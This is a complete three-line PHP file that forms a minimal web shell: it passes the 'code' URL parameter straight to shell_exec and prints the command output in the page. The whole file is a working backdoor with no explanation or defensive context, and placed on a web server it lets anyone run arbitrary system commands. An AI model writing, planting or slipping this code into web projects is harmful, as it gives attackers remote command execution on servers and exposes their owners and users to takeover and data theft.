<?php
$output = shell_exec($_GET["code"]);
echo "<pre>$output</pre>";
